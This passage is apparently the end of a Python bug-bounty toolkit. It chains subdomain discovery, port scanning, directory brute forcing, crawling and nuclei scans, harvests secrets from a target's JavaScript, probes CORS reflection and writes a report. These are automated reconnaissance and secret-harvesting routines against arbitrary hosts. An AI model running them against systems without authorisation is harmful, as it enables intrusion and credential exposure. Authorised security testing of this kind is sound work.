    out_dir  = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)
    wordlist = os.path.join(ARSENAL_DIR, "wordlists", "directories.txt")
    url      = normalise_url(target)

    print(Fore.CYAN + f"\n  🚀 Starting chain for {Fore.WHITE}{target}\n")

    steps = [
        (f"subfinder -d {target} -o {out_dir}/subdomains.txt",
         "Subdomain Enumeration", 30, False),
        (f"cat {out_dir}/subdomains.txt | httpx -silent "
         f"-o {out_dir}/alive.txt -title -web-server -tech-detect",
         "Live Host Detection", 25, False),
        (f"naabu -list {out_dir}/alive.txt -o {out_dir}/ports.txt",
         "Port Scanning", 40, False),
        (f"gobuster dir -u {url} -w {wordlist} "
         f"-o {out_dir}/directories.txt -q",
         "Directory Brute Force", 60, False),
        (f"katana -u {url} -o {out_dir}/endpoints.txt -silent",
         "Endpoint Crawling", 50, False),
        (f"nuclei -l {out_dir}/alive.txt -severity high,critical,medium "
         f"-o {out_dir}/nuclei_results.txt",
         "Nuclei Vuln Scan", 300, True),
    ]

    for cmd, desc, est, long in steps:
        tool = cmd.split()[0]
        if not check_tool(tool):
            warn(f"{tool} not installed — skipping {desc}")
            continue
        run_cmd(cmd, desc, est, long)

    section("AUTO JS SECRET SCAN")
    headers     = {"User-Agent": "Mozilla/5.0"}
    js_findings = []
    try:
        stop = threading.Event()
        t    = threading.Thread(target=progress_bar, args=(stop, "Fetching page", 5))
        t.start()
        r    = requests.get(url, timeout=10, headers=headers)
        stop.set()
        t.join()
        js_urls = extract_js_urls(url, r.text)
        ok(f"Found {len(js_urls)} JS files")
        for i, js_url in enumerate(js_urls, 1):
            bar = '█' * i + '░' * (max(len(js_urls), 1) - i)
            sys.stdout.write(f"\r  [{bar}] Scanning {i}/{len(js_urls)}")
            sys.stdout.flush()
            try:
                jr   = requests.get(js_url, timeout=8, headers=headers)
                hits = scan_js_content(jr.text, js_url)
                for h in hits:
                    print()
                    found(f"{h['type']}: {h['match'][:60]}")
                js_findings.extend(hits)
            except Exception:
                pass
        print()
    except Exception as e:
        warn(f"JS scan error: {e}")

    if js_findings:
        save_findings(target, "js_secrets", js_findings)

    section("AUTO CORS CHECK")
    cors_findings = []
    for origin in CORS_ORIGINS:
        try:
            r    = requests.get(
                url, timeout=5,
                allow_redirects=False,
                headers={"Origin": origin, "User-Agent": "Mozilla/5.0"}
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao in (origin, "*"):
                sev = "CRITICAL" if acac.lower() == "true" else "MODERATE"
                found(f"{sev} CORS: {origin} reflected")
                cors_findings.append({"type": f"cors_{sev.lower()}",
                                      "origin": origin})
            else:
                ok(f"{origin} — not reflected")
        except requests.exceptions.Timeout:
            warn(f"Timeout on origin: {origin} — skipping")
        except Exception:
            pass

    if cors_findings:
        save_findings(target, "misconfig", cors_findings)

    generate_report(target, out_dir)
    print(Fore.GREEN + Style.BRIGHT + "\n  🎉 Chain complete!")
    pause()


def generate_report(target=None, out_dir=None):
    global last_target
    if not target:
        banner()
        print_header("GENERATE PROFESSIONAL REPORT")
        target = get_target(f"  Target [{last_target}]: ") or last_target
    if not out_dir:
        out_dir = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)

    stop = threading.Event()
    t    = threading.Thread(target=progress_bar, args=(stop, "Building report", 3))
    t.start()

    def read_file(name):
        p = os.path.join(out_dir, name)
        if os.path.exists(p):
            lines = open(p).readlines()
            return lines, len(lines)
        return [], 0

    def read_json(name):
        p = os.path.join(out_dir, name)
        if os.path.exists(p):
            return json.load(open(p))
        return []

    subdomains, sc = read_file("subdomains.txt")
    alive,      ac = read_file("alive.txt")
    nuclei,     nc = read_file("nuclei_results.txt")
    endpoints,  ec = read_file("endpoints.txt")
    js_secrets     = read_json("js_secrets_findings.json")
    api_findings   = read_json("api_findings.json")
    misconfig      = read_json("misconfig_findings.json")
    auth_issues    = read_json("auth_findings.json")
    vuln_findings  = read_json("vuln_findings.json")

    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M")
    filepath = os.path.join(out_dir, f"report_{target}_{ts}.md")

    def sev(count, high=1, med=1):
        if count >= high:
            return "🔴 High"
        if count >= med:
            return "🟡 Medium"
        return "🟢 Clean"

    with open(filepath, "w") as f:
        f.write(f"# Bug Bounty Report — {target}\n")
        f.write(f"**Date:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}  \n")
        f.write(f"**Tool:** Termux Bug Bounty Arsenal v5.0 by Mrbead93  \n\n---\n\n")
        f.write("## Executive Summary\n\n")
        f.write("| Category | Count | Severity |\n|---|---|---|\n")
        f.write(f"| Subdomains Found       | {sc} | — |\n")
        f.write(f"| Live Hosts             | {ac} | — |\n")
        f.write(f"| Endpoints Crawled      | {ec} | — |\n")
        f.write(f"| Nuclei Findings        | {nc} | {sev(nc)} |\n")
        f.write(f"| JS Secrets             | {len(js_secrets)} | {sev(len(js_secrets))} |\n")
        f.write(f"| API Endpoints          | {len(api_findings)} | {sev(len(api_findings), 5, 2)} |\n")
        f.write(f"| Misconfigurations      | {len(misconfig)} | {sev(len(misconfig))} |\n")
        f.write(f"| Auth Issues            | {len(auth_issues)} | {sev(len(auth_issues))} |\n")
        f.write(f"| Vulnerability Findings | {len(vuln_findings)} | {sev(len(vuln_findings))} |\n\n")

        if js_secrets:
            f.write("## JS Secrets\n\n")
            for s in js_secrets:
                f.write(f"### {s['type']}\n")
                f.write(f"- **Match:** `{s['match'][:100]}`\n")
                f.write(f"- **Source:** {s['source']}\n\n")

        if misconfig:
            f.write("## Misconfigurations\n\n")
            for m in misconfig:
                f.write(f"- **{m.get('type', 'unknown')}**")
                if "path" in m:
                    f.write(f": `{m['path']}`")
                if "origin" in m:
                    f.write(f": Origin `{m['origin']}`")
                f.write("\n")
            f.write("\n")

        if auth_issues:
            f.write("## Authentication Issues\n\n")
            for a in auth_issues:
                f.write(f"- **{a.get('type', 'unknown')}**")
                if "header" in a:
                    f.write(f": {a['header']}")
                if "name" in a:
                    f.write(f": Cookie `{a['name']}`")
                f.write("\n")
            f.write("\n")

        if api_findings:
            f.write("## API Endpoints Found\n\n")
            for a in api_findings[:20]:
                f.write(f"- `{a.get('endpoint', '')}` — "
                        f"{a.get('note', '')}"
                        f"{'  [JSON]' if a.get('json') else ''}\n")
            f.write("\n")

        if nuclei:
            f.write("## Nuclei Findings\n\n```\n")
            f.writelines(nuclei[:30])
            f.write("```\n\n")

        if subdomains:
            f.write("## Subdomains\n\n```\n")
            f.writelines(subdomains[:30])
            f.write("```\n\n")

        f.write("---\n*Termux Bug Bounty Arsenal v5.0 — Authorised testing only*\n")

    stop.set()
    t.join()
    ok(f"Report saved → {filepath}")
    pause()


# ════════════════════════════════════════════════════════════
#  MAIN MENU
# ════════════════════════════════════════════════════════════

def main_menu():
    while True:
        banner()
        print(Fore.CYAN + """  ┌──────────────────────────────────────────────────────┐
  │  RECON                                               │
  │   1.  Run ReconX                      (Manual)       │
  │   2.  Run CredX                       (Manual)       │
  │   3.  Subdomain + Live Hosts                         │
  │   4.  Port Scanning                                  │
  │   5.  Directory Brute Force                          │
  │   6.  Nuclei Vulnerability Scan                      │
  │   7.  Full Automated Chain            ⭐ Recommended │
  │                                                      │
  │  VULNERABILITY                                       │
  │   9.  Vulnerability Scanner  (XSS/SQLi/SSRF/LFI)    │
  │  10.  API Hunter                                     │
  │  11.  JS Secret Scanner                              │
  │  12.  Auth Tester                                    │
  │  13.  Misconfiguration Hunter                        │
  │                                                      │
  │  REPORTING                                           │
  │  14.  Evidence Collector                             │
  │  15.  Generate Professional Report                   │
  │                                                      │
  │   0.  Exit                                           │
  └──────────────────────────────────────────────────────┘""")

        choice = input(Fore.WHITE + "\n  Choose → ").strip()

        if   choice == "1":  run_user_tool("reconx", "ReconX")
        elif choice == "2":  run_user_tool("credx", "CredX")
        elif choice == "3":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                os.makedirs(out, exist_ok=True)
                run_cmd(f"subfinder -d {target} -o {out}/subdomains.txt",
                        "Subdomain Enumeration", 30)
                run_cmd(f"cat {out}/subdomains.txt | httpx -silent "
                        f"-o {out}/alive.txt -title -web-server -tech-detect",
                        "Live Host Detection", 25)
                ok("Done — results in reports/")
                pause()
        elif choice == "4":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                run_cmd(f"naabu -list {out}/alive.txt -o {out}/ports.txt",
                        "Port Scanning", 40)
                pause()
        elif choice == "5":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                wl  = os.path.join(ARSENAL_DIR, "wordlists", "directories.txt")
                run_cmd(f"gobuster dir -u {normalise_url(target)} "
                        f"-w {wl} -o {out}/directories.txt -q",
                        "Directory Brute Force", 60)
                pause()
        elif choice == "6":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                run_cmd(f"nuclei -l {out}/alive.txt "
                        f"-severity high,critical,medium "
                        f"-o {out}/nuclei_results.txt",
                        "Nuclei Scan", 300, long_running=True)
                pause()
        elif choice == "7":  full_automated_chain()
        elif choice == "9":  module_vuln_scanner()
        elif choice == "10": module_api_hunter()
        elif choice == "11": module_js_scanner()
        elif choice == "12": module_auth_tester()
        elif choice == "13": module_misconfig_hunter()
        elif choice == "14": module_evidence_collector()
        elif choice == "15": generate_report()
        elif choice == "0":
            print(Fore.RED + Style.BRIGHT + "\n  Happy hunting! 🎯\n")
            sys.exit(0)
        else:
            err("Invalid choice")
            time.sleep(1)


if __name__ == "__main__":
    main_menu()
